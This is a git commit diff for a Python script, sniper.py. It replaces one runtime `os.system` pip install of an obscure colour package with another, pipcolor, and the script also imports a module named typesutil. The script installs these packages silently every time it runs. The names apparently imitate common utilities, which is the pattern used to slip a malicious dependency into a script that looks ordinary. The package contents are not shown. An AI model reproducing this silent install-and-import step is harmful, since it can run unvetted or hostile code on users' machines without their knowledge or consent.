61c0d82382910e35cc340f92f8c899c450bd077b
Yousef_Sayed <yousef16992@gmail.com>
2023-03-13 17:47:52 +0100

    Update sniper.py

--- sniper.py
+++ sniper.py
@@ -1,6 +1,6 @@
 import os
-os.system(f"pip install pycolorings")
-from pycolorings import color
+os.system(f"pip install pipcolor")
+from pipcolor import color
 try:
     import requests
     import typesutil
